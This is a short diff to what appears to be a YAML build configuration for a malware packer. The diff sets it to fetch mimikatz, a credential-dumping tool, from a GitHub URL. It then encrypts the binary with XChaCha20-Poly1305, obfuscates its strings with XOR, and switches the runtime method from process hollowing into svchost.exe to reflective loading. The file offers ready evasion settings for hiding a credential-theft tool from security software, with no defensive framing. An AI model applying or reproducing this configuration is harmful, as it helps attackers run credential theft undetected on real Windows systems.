@@ -6,10 +6,12 @@ name: mimikatz-basic
 
 build:
   payload:
-    source: ./mimikatz.exe
+    source: "https://github.com/ParrotSec/mimikatz/raw/refs/heads/master/x64/mimikatz.exe"
     crypto:
       algo: xchacha20poly1305
       key: random
+  strings:
+    strategy: xor
   output:
     path: ./dist/mimikatz_packed.exe
     arch: x64
@@ -17,5 +19,5 @@ build:
     trim_paths: all
 
 runtime:
-  - technique: process_hollowing
-    target: "C:\\Windows\\System32\\svchost.exe"
+
+  - technique: reflective_loading
